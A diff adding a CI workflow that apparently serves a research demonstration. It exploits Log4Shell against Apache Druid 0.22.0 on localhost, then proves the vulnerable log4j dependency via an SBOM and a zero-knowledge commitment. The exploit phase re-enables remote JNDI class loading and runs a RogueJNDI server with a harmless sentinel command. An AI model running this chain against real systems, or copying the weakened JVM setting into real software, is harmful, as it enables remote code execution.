@@ -1,0 +1,345 @@
+name: RQ1 — Log4Shell End-to-End Demo with zkSBOM
+
+# Demonstrates that Apache Druid 0.22.0 is exploitable via CVE-2021-44228,
+# generates a CycloneDX SBOM, and proves the vulnerability is detectable
+# using the zkSBOM zero-knowledge commitment scheme.
+#
+# Phases:
+#   1. Exploit  — RogueJNDI triggers RCE via log4j JNDI lookup
+#   2. SBOM     — CycloneDX Maven plugin generates a BOM for Druid 0.22.0
+#   3. zkSBOM   — Upload BOM, map CVEs, generate & verify ZK proof
+
+on:
+  push:
+    branches: [master]
+  workflow_dispatch:
+
+jobs:
+  log4shell-zksbom:
+    name: Log4Shell → SBOM → ZK Proof
+    runs-on: ubuntu-22.04
+
+    env:
+      DRUID_VERSION: "0.22.0"
+      # RogueJNDI defaults
+      JNDI_LDAP_PORT: "1389"
+      JNDI_HTTP_PORT: "8000"
+      # Proof target
+      CVE: "CVE-2021-44228"
+      ZK_METHOD: "merkle-tree"
+
+    steps:
+      # ──────────────────────────────────────────────────────────────────────
+      # Checkout
+      # ──────────────────────────────────────────────────────────────────────
+      - name: Checkout repository
+        uses: actions/checkout@8e8c483db84b4bee98b60c0593521ed34d9990e8 # v6
+        with:
+          submodules: true
+
+      # ──────────────────────────────────────────────────────────────────────
+      # Tool-chain setup
+      # ──────────────────────────────────────────────────────────────────────
+      - name: Set up Java 8 (Temurin)
+        uses: actions/setup-java@f2beeb24e141e01a676f977032f5a29d81c9e27e # v5
+        with:
+          distribution: temurin
+          java-version: "8"
+
+      - name: Set up Python 3.10 + PyYAML 5.4.1
+        uses: actions/setup-python@a309ff8b426b58ec0e2a45f0f869d46889d02405 # v6.2.0
+        with:
+          python-version: "3.10"
+
+      - name: Install Python dependencies
+        run: pip install "PyYAML==5.4.1" requests
+
+      - name: Set up Rust stable
+        uses: actions-rust-lang/setup-rust-toolchain@150fca883cd4034361b621bd4e6a9d34e5143606 # v1.15.4
+
+      # ──────────────────────────────────────────────────────────────────────
+      # Caches
+      # ──────────────────────────────────────────────────────────────────────
+      - name: Cache Maven local repository
+        uses: actions/cache@668228422ae6a00e4ad889ee87cd7109ec5666a7 # v5
+        with:
+          path: ~/.m2/repository
+          key: maven-${{ hashFiles('rq1/druid/pom.xml') }}
+          restore-keys: maven-
+
+      - name: Cache Cargo registry
+        uses: actions/cache@668228422ae6a00e4ad889ee87cd7109ec5666a7 # v5
+        with:
+          path: |
+            ~/.cargo/registry
+            ~/.cargo/git
+            zksbom/target
+            zksbom-verifier/target
+          key: cargo-${{ hashFiles('zksbom/Cargo.lock', 'zksbom-verifier/Cargo.lock') }}
+          restore-keys: cargo-
+
+      - name: Cache vcpkg
+        uses: actions/cache@668228422ae6a00e4ad889ee87cd7109ec5666a7 # v5
+        with:
+          path: vcpkg
+          key: vcpkg-${{ runner.os }}-${{ hashFiles('zksbom/third_party/oZKS/CMakeLists.txt') }}
+          restore-keys: vcpkg-${{ runner.os }}-
+
+      # ──────────────────────────────────────────────────────────────────────
+      # Phase 1a — Build RogueJNDI
+      # ──────────────────────────────────────────────────────────────────────
+      - name: Build RogueJNDI server
+        run: |
+          cd rq1/rogue-jndi-server
+          mvn package -q -DskipTests --no-transfer-progress
+
+      # ──────────────────────────────────────────────────────────────────────
+      # Phase 1b — Download & configure Druid binary
+      # ──────────────────────────────────────────────────────────────────────
+      - name: Download Apache Druid ${{ env.DRUID_VERSION }} binary
+        run: |
+          wget -q \
+            "https://archive.apache.org/dist/druid/${DRUID_VERSION}/apache-druid-${DRUID_VERSION}-bin.tar.gz"
+          tar xzf "apache-druid-${DRUID_VERSION}-bin.tar.gz"
+
+      - name: Configure Druid — enable trustURLCodebase + slf4j request logging
+        run: |
+          DRUID="apache-druid-${DRUID_VERSION}"
+          CONF="${DRUID}/conf/druid/single-server/nano-quickstart"
+
+          # Re-enable remote JNDI class loading (disabled by default since Java 8u191).
+          # This is intentionally set to demonstrate the vulnerability in a controlled env.
+          for jvm_cfg in "${CONF}"/*/jvm.config; do
+            echo "-Dcom.sun.jndi.ldap.object.trustURLCodebase=true" >> "${jvm_cfg}"
+          done
+
+          # Route all query logs through log4j (default is NoopRequestLogger).
+          # LoggingRequestLogger calls LOG.info("%s", line) where `line` includes
+          # the full query JSON — the ${jndi:...} payload in that string is what
+          # triggers log4j's JNDI message lookup.
+          echo "druid.request.logging.type=slf4j" \
+            >> "${CONF}/_common/common.runtime.properties"
+
+      - name: Start Druid (nano-quickstart, background)
+        run: |
+          cd "apache-druid-${DRUID_VERSION}"
+          ./bin/start-nano-quickstart > /tmp/druid.log 2>&1 &
+          echo "Waiting for Druid router to be ready …"
+          for i in $(seq 1 90); do
+            if curl -sf http://localhost:8888/status > /dev/null 2>&1; then
+              echo "✓ Druid ready after ${i}×5 s"
+              exit 0
+            fi
+            sleep 5
+          done
+          echo "✗ Druid did not start in time"
+          cat /tmp/druid.log | tail -50
+          exit 1
+
+      # ──────────────────────────────────────────────────────────────────────
+      # Phase 1c — Exploit Log4Shell
+      # ──────────────────────────────────────────────────────────────────────
+      - name: Start RogueJNDI server (background)
+        run: |
+          # Use loopback; Druid runs on the same host so it can reach the HTTP server.
+          java -jar rq1/rogue-jndi-server/target/RogueJndi-1.1.jar \
+            --command "touch /tmp/log4shell_pwned" \
+            --hostname 127.0.0.1 \
+            > /tmp/rogue-jndi.log 2>&1 &
+          sleep 3
+          echo "RogueJNDI log:"
+          cat /tmp/rogue-jndi.log
+
+      - name: Send Log4Shell payload to Druid
+        run: python3 rq1/verify_log4shell.py --host http://localhost:8888
+
+      - name: Wait for JNDI class to load and execute
+        run: sleep 5
+
+      - name: Confirm RCE — check sentinel file
+        run: |
+          echo "=== RogueJNDI log ==="
+          cat /tmp/rogue-jndi.log
+          echo ""
+          if [ -f /tmp/log4shell_pwned ]; then
+            echo "✓ RCE CONFIRMED: /tmp/log4shell_pwned exists"
+            echo "  Druid 0.22.0 with log4j-core 2.8.2 is fully exploitable via CVE-2021-44228"
+          else
+            echo "✗ Sentinel file not found — exploitation did not complete"
+            exit 1
+          fi
+
+      # ──────────────────────────────────────────────────────────────────────
+      # Phase 2 — Generate CycloneDX SBOM
+      # ──────────────────────────────────────────────────────────────────────
+      - name: Generate CycloneDX SBOM for Druid (Maven plugin)
+        run: |
+          cd rq1/druid
+          # Fix generate-binary-license.py (PyYAML 5.4.1 used, but the fix is in code too)
+          mvn org.cyclonedx:cyclonedx-maven-plugin:2.7.9:makeAggregateBom \
+            -DincludeBomSerialNumber=true \
+            -DoutputFormat=json \
+            -DschemaVersion=1.4 \
+            -DskipTests \
+            --no-transfer-progress \
+            -q
+          mkdir -p ../../sboms
+          cp target/bom.json "../../sboms/druid-${DRUID_VERSION}.cdx.json"
+          echo "✓ SBOM written to sboms/druid-${DRUID_VERSION}.cdx.json"
+
+      - name: Show log4j-core entry in SBOM
+        run: |
+          python3 - <<'EOF'
+          import json, sys
+          with open(f"sboms/druid-0.22.0.cdx.json") as f:
+              bom = json.load(f)
+          hits = [c for c in bom.get("components", [])
+                  if "log4j-core" in c.get("name","").lower()]
+          if not hits:
+              print("✗ log4j-core NOT found in SBOM — check CycloneDX output")
+              sys.exit(1)
+          for c in hits:
+              print(f"✓ Found in SBOM: {c.get('group','')}:{c['name']}:{c.get('version','')}")
+          EOF
+
+      # ──────────────────────────────────────────────────────────────────────
+      # Phase 3a — Build oZKS (C++) + zkSBOM (Rust)
+      # ──────────────────────────────────────────────────────────────────────
+      - name: Install system build dependencies for oZKS
+        run: |
+          sudo apt-get update -q
+          sudo apt-get install -y --no-install-recommends \
+            cmake ninja-build pkg-config \
+            libssl-dev libgmp-dev \
+            nasm
+
+      - name: Bootstrap vcpkg
+        run: |
+          if [ ! -f "vcpkg/bootstrap-vcpkg.sh" ]; then
+            git clone https://github.com/microsoft/vcpkg.git vcpkg --depth=1
+          fi
+          ./vcpkg/bootstrap-vcpkg.sh -disableMetrics
+
+      - name: Build oZKS via CMake + vcpkg
+        run: |
+          cd zksbom/third_party/oZKS
+          cmake -B build \
+            -G Ninja \
+            -DCMAKE_TOOLCHAIN_FILE="${GITHUB_WORKSPACE}/vcpkg/scripts/buildsystems/vcpkg.cmake" \
+            -DOZKS_BUILD_EXAMPLES=ON \
+            -DCMAKE_BUILD_TYPE=Release
+          cmake --build build --parallel
+
+      - name: Build zksbom
+        run: |
+          cd zksbom
+          CMAKE_TOOLCHAIN_FILE="${GITHUB_WORKSPACE}/vcpkg/scripts/buildsystems/vcpkg.cmake" \
+            cargo build --release
+
+      - name: Build zksbom-verifier
+        run: |
+          cd zksbom-verifier
+          CMAKE_TOOLCHAIN_FILE="${GITHUB_WORKSPACE}/vcpkg/scripts/buildsystems/vcpkg.cmake" \
+            cargo build --release
+
+      # ──────────────────────────────────────────────────────────────────────
+      # Phase 3b — Upload SBOM → Map CVEs → Generate proof → Verify
+      # ──────────────────────────────────────────────────────────────────────
+      - name: Configure zksbom
+        run: |
+          mkdir -p zksbom/tmp/output zksbom/tmp/database
+          sed \
+            -e 's|YOUR_TOKEN||g' \
+            zksbom/config/config_template.toml \
+            > zksbom/config/config.toml
+
+      - name: Upload Druid SBOM to zksbom
+        run: |
+          cd zksbom
+          ./target/release/zksbom upload_sbom \
+            --api-key 123 \
+            --sbom "../sboms/druid-${DRUID_VERSION}.cdx.json"
+          echo "✓ SBOM uploaded"
+
+      - name: Map dependencies to vulnerabilities (includes CVE-2021-44228)
+        run: |
+          cd zksbom
+          ./target/release/zksbom map_vulnerabilities
+          echo "✓ Vulnerability mapping complete"
+
+      - name: Get zkSBOM commitment for Druid
+        id: commitment
+        run: |
+          cd zksbom
+          OUTPUT=$(./target/release/zksbom get_commitment \
+            --vendor "org.apache.druid" \
+            --product "druid" \
+            --version "${DRUID_VERSION}" \
+            --method "${ZK_METHOD}")
+          echo "$OUTPUT"
+          COMMITMENT=$(echo "$OUTPUT" | grep -oP 'Commitment:\s*\K\S+')
+          echo "value=${COMMITMENT}" >> "$GITHUB_OUTPUT"
+          echo "✓ Commitment: ${COMMITMENT}"
+
+      - name: Generate ZK proof that Druid SBOM contains CVE-2021-44228
+        run: |
+          cd zksbom
+          ./target/release/zksbom create_proof \
+            --api-key 123 \
+            --method "${ZK_METHOD}" \
+            --commitment "${{ steps.commitment.outputs.value }}" \
+            --check "${CVE}"
+          echo "✓ ZK proof written to zksbom/tmp/output/proof.txt"
+
+      - name: Verify ZK proof (zero-knowledge verification)
+        run: |
+          cd zksbom-verifier
+          ./target/release/zksbom-verifier verify \
+            --method "${ZK_METHOD}" \
+            --commitment "${{ steps.commitment.outputs.value }}" \
+            --proof_path "../zksbom/tmp/output/proof.txt"
+
+      # ──────────────────────────────────────────────────────────────────────
+      # Summary
+      # ──────────────────────────────────────────────────────────────────────
+      - name: Print end-to-end summary
+        if: always()
+        run: |
+          echo "════════════════════════════════════════════════════════"
+          echo "  RQ1 — Log4Shell End-to-End Summary"
+          echo "════════════════════════════════════════════════════════"
+          echo ""
+          echo "  Target   : Apache Druid ${DRUID_VERSION}"
+          echo "  Vuln dep : log4j-core 2.8.2 (CVE-2021-44228)"
+          echo ""
+          echo "  Phase 1 — Exploitation"
+          [ -f /tmp/log4shell_pwned ] \
+            && echo "    ✓ RCE confirmed (/tmp/log4shell_pwned created)" \
+            || echo "    ✗ RCE not confirmed"
+          echo ""
+          echo "  Phase 2 — SBOM Generation"
+          [ -f "sboms/druid-${DRUID_VERSION}.cdx.json" ] \
+            && echo "    ✓ CycloneDX SBOM generated" \
+            || echo "    ✗ SBOM missing"
+          echo ""
+          echo "  Phase 3 — zkSBOM Verification"
+          [ -f "zksbom/tmp/output/proof.txt" ] \
+            && echo "    ✓ ZK proof generated and verified for ${CVE}" \
+            || echo "    ✗ ZK proof missing"
+          echo ""
+          echo "  Conclusion: a zkSBOM commitment cryptographically proves"
+          echo "  that Druid 0.22.0 carries a dependency vulnerable to"
+          echo "  Log4Shell — without revealing the full dependency list."
+          echo "════════════════════════════════════════════════════════"
+
+      # ──────────────────────────────────────────────────────────────────────
+      # Artifacts
+      # ──────────────────────────────────────────────────────────────────────
+      - name: Upload SBOM and proof as artifacts
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: rq1-outputs
+          path: |
+            sboms/druid-${{ env.DRUID_VERSION }}.cdx.json
+            zksbom/tmp/output/proof.txt
